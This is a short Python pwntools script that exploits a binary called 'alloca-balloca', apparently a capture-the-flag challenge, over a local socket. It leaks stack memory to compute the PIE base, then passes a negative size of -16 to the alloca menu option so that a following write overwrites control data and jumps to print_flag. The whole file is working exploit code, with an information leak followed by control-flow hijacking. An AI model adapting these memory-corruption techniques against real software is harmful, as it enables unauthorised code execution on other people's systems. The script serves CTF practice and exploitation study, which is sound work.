from pwn import *

prog = ELF("alloca-balloca")
#p = process("./alloca-balloca")
p = remote("127.0.0.1", 50000)
#gdb.attach(p)

def alloca(idx, sz):
    p.sendlineafter(">", "1")
    p.sendlineafter(":", str(idx))
    p.sendlineafter(":", str(sz))

def read(idx):
    p.sendlineafter(">", "2")
    p.sendlineafter(":", str(idx))
    p.recvline()

def write(idx, data):
    p.sendlineafter(">", "3")
    p.sendlineafter(":", str(idx))
    p.sendline(data)


alloca(0, 0x100)
read(0)

leak = p.recv(0x100)
print(hexdump(leak))

pie_leak = u64(leak[0xa8:0xa8+8])
log.info(f"PIE leak: 0x{pie_leak:02x}")

# setup PIE base
prog.address = pie_leak - 0x2045
log.info(f"PIE: 0x{prog.address:02x}")


log.info(f"print_flag should be at: 0x{prog.symbols['print_flag']:02x}")

write(0, b'A'*0x10)

alloca(1, -16)

buf = b''
buf += p64(0x414141)

buf += p64(prog.symbols['print_flag'])
buf += p64(prog.symbols['print_flag'])

write(1, buf)

p.interactive()
